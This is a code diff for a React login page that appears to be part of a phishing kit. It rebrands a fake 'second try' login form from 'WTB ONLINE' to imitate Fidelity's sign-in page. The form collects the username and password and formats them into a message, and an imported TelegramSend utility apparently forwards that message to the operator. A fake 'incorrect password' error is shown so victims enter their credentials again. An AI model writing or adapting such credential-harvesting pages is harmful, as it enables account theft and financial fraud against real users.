@@ -1,5 +1,5 @@
 import React from "react";
-import Logo from "../assets/logo.jpeg";
+import fid from "../assets/fidelity.svg";
 import { useNavigate } from "react-router-dom";
 import cookies from "../utils/cookie.config";
 import TelegramSend from "../utils/send-message";
@@ -23,7 +23,7 @@ export default function Login2() {
   async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
     event.preventDefault();
     const message = `
-        ---- WTB ONLINE (SECOND TRY) -----
+        ---- FIDELITY (SECOND TRY) -----
         Username: ${formInput.username2}
         Password: ${formInput.password2}
         `;
@@ -36,67 +36,55 @@ export default function Login2() {
 
   return (
     <>
+      <div className="navbar">
+        <div className="brand">
+          <div>
+            <img src={fid} alt="" />
+          </div>
+        </div>
+
+        <div className="nav-texts">
+          <p style={{ marginRight: 20 }}>Security</p>
+          <p>FAQ</p>
+        </div>
+      </div>
+
       <div className="content">
         <div className="form">
-          <form onSubmit={handleSubmit} method="POST">
-            <div className="form-item">
-              <div className="brand">
-                <img src={Logo} alt="" />
-              </div>
-              <p
-                style={{
-                  color: "red",
-                  border: "thin solid red",
-                  padding: 10,
-                  
-                  fontSize: 15,
-                }}
-              >
-                You've entered an incorrect username or password. Please try
-                again.
-              </p>
+            <form onSubmit={handleSubmit} method="POST">
+          <div className="form-item">
+            <h2>Log in</h2>
+            <p style={{color:"red", border:"thin solid red", padding: 10, fontSize:15}}>You've entered an incorrect username or password. Please try again.</p>
               <div className="form-field">
-                <input
-                  onChange={handleInputChange}
-                  name="username2"
-                  type="text"
-                  placeholder="Username"
-                />
+                <label htmlFor="">Username</label>
+                <input onChange={handleInputChange} name="username2" type="text" />
               </div>
 
               <div className="form-field">
-                <input
-                  onChange={handleInputChange}
-                  type="password"
-                  name="password2"
-                  placeholder="Password"
-                />
+                <label htmlFor="">Password</label>
+                <input onChange={handleInputChange} type="password" name="password2" />
               </div>
 
-              <div
-                style={{
-                  display: "flex",
-                  alignItems: "center",
-                  justifyContent: "space-between",
-                  marginTop: "-20px",
-                }}
-              >
-                <p className="btn-theme-color bold reduce-text">
-                  First time user? Enroll now.
-                </p>
-                {isLoading ? (
-                  <div className="form-field">
-                    <button style={{ width: 130, height: 50 }} type="button">Please wait...</button>
-                  </div>
-                ) : (
-                  <div className="form-field">
-                    <button style={{ width: 120, height: 50 }} type="submit">
-                      Continue
-                    </button>
-                  </div>
-                )}
+              <div style={{ display: "flex", alignItems: "center" }}>
+                <input
+                  style={{ width: 15, height: 15, marginRight: 5 }}
+                  type="checkbox"
+                />{" "}
+                <p>Remember my username</p>
               </div>
-            </div>
+              {isLoading ? (
+                <div className="form-field">
+                  <button type="button">Please wait...</button>
+                </div>
+              ) : (
+                <div className="form-field">
+                  <button type="submit">Log in</button>
+                </div>
+              )}
+
+              <a href="">Forgot username or password?</a>
+            
+          </div>
           </form>
         </div>
       </div>
